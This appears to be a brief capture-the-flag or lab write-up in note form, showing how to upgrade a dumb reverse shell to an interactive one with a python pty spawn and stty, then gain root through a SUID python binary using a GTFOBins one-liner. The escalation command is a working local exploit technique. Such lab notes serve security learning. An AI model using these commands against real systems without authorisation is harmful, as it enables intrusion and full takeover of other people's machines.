Let's get from Dumb shell to interactive shell
```
This dumb shell will stop working if you use Ctrl + C.

Hence you have to upgrade it.

Usually there's python installed on the box, which allows you to use 
python -c "__import__('pty').spawn('/bin/bash')" or similar.

stty -raw echo;fg 

Finally, type reset.

Input your TERM var (usually xterm-256color).
```

Can't run the linpeas.sh so we have to stick with manual testing only and suid seems interesting to me

https://gtfobins.github.io/gtfobins/python/
As you know gtbobins is our best friend we have python , at, mount but will go with python and i was right with little tweaks here and there i was able to escalate as root.
```
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
![[Pasted image 20231020142137.png]]

